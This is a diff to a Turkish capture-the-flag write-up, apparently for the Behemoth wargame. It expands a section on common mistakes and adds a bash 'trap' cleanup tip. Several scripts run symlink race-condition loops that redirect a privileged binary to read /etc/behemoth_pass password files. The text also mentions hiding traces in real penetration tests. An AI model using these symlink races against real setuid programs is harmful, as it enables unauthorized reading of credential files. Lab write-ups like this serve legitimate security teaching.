@@ -190,21 +190,27 @@ if (fd == -1 && errno == ELOOP) {
 
 ## 🚨 4. Yeni Başlayanların Düştüğü Tuzaklar
 
-**Saldırı penceresini kaçırmak.** Race condition'larda zamanlama her şeydir. Binary hızlı çalışıyorsa `sleep()` yoksa pencere çok kısa olabilir. Çözüm: symlink'i binary başlamadan **önce** oluşturmayı dene, ya da `while true` döngüsüyle sürekli dene.
+### Tuzak 1 — Saldırı penceresini kaçırmak
+
+Race condition'larda zamanlama her şeydir. Binary hızlı çalışıyorsa pencere çok kısa olabilir. Symlink'i binary başlamadan **önce** oluşturmayı dene, ya da `while true` döngüsüyle sürekli dene.
 
 ```bash
 # Döngü ile symlink saldırısı
 while true; do
     ln -sf /etc/behemoth_pass/behemoth3 /tmp/behemoth2.* 2>/dev/null
 done &
-ATTACK_PID=$!
+RACE_PID=$!
 /behemoth/behemoth2
-kill $ATTACK_PID   # Döngüyü öldürmeyi unutma!
+kill $RACE_PID   # Döngüyü öldürmeyi unutma!
 ```
 
-**Arka plan sürecini `kill` etmeyi unutmak.** `&` ile başlattığın saldırı döngüsünü kill etmezsen, oturum kapandıktan sonra bile arka planda çalışmaya devam eder. Her zaman `PID=$!` ile PID'i kaydet ve işin bitince `kill $PID` çalıştır.
+### Tuzak 2 — Arka plan sürecini `kill` etmeyi unutmak
 
-**PID hesaplamasında yanılmak.** Behemoth4'te binary'yi `&` ile çalıştırınca birden fazla süreç üretebilir (fork). `$!` sadece en son arka plan sürecinin PID'ini verir. `ltrace /behemoth/behemoth4` çıktısında hangi PID formatında dosya aradığını doğrula.
+`&` ile başlattığın döngüyü kill etmezsen, oturum kapandıktan sonra bile arka planda çalışmaya devam eder. Her zaman `RACE_PID=$!` ile PID'i kaydet ve işin bitince `kill $RACE_PID` çalıştır.
+
+### Tuzak 3 — PID hesaplamasında yanılmak
+
+Behemoth4'te binary'yi `&` ile çalıştırınca birden fazla süreç üretebilir (fork). `$!` sadece en son arka plan sürecinin PID'ini verir. `ltrace` çıktısında hangi PID formatında dosya aradığını doğrula.
 
 ```bash
 # PID'i doğrula
@@ -213,11 +219,57 @@ echo "Tahmin edilen PID: $!"
 ltrace /behemoth/behemoth4 2>&1 | grep fopen
 ```
 
-**`/tmp` dizinini kirletmek.** Birden fazla sembolik link deneyimi sonrasında `/tmp` altında sahte dosyalar kalabilir. Başlamadan önce temizle:
+### Tuzak 4 — `/tmp` dizinini kirletmek
+
+Birden fazla deneme sonrasında `/tmp` altında sahte dosyalar kalabilir. Başlamadan önce temizle:
 
 ```bash
 rm -f /tmp/behemoth2.* /tmp/behemoth4.*
 ```
+
+---
+
+## 💡 Pro-Tip: Temiz Race Condition Scriptleri — `trap` Kullanımı
+
+Race condition saldırılarında arka planda sonsuz döngüler (`while true; do ... done &`) başlatırız. En büyük hata: exploit başarılı olduğunda veya `Ctrl+C` ile çıktığında bu döngüleri kendi haline bırakmak.
+
+**Neden tehlikeli?** Paylaşımlı CTF veya wargame sunucularında arka planda kalan döngüler CPU'yu sonuna kadar tüketir, sunucuyu kilitler ve diğer oyuncuları etkiler. Genellikle banlanma sebebidir.
+
+**Çözüm:** Script başına `trap` ekle — script herhangi bir sebeple kapandığında (Ctrl+C, hata, normal çıkış) arka plandaki süreçler **otomatik olarak** temizlenir.
+
+```bash
+#!/bin/bash
+
+# Script kapandığında çalışacak temizlik fonksiyonu
+temizlik() {
+    echo -e "\n[!] Sinyal yakalandı! Temizlik yapılıyor..."
+    kill $RACE_PID 2>/dev/null      # Arka plandaki race döngüsünü öldür
+    rm -f /tmp/behemoth2.*          # Geçici dosyaları temizle
+    exit
+}
+
+# INT (Ctrl+C), TERM ve EXIT sinyallerini yakala
+trap temizlik INT TERM EXIT
+
+# 1. Symlink döngüsünü arka planda başlat
+while true; do
+    ln -sf /tmp/guvenli /tmp/tuzak
+    ln -sf /etc/behemoth_pass/behemoth3 /tmp/tuzak
+done &
+RACE_PID=$!
+
+echo "[+] Race döngüsü başladı. (PID: $RACE_PID)"
+echo "[+] Hedef tetikleniyor..."
+
+# 2. Hedef programı defalarca çalıştır
+for i in $(seq 1 200); do
+    /behemoth/behemoth2 /tmp/tuzak 2>/dev/null
+done
+
+# Script normal bitse bile trap devreye girer ve temizler
+```
+
+Bu alışkanlık sadece CTF'lerde değil, gerçek dünya sızma testlerinde de hedef sistemde iz bırakmamak için kritiktir.
 
 ---
 
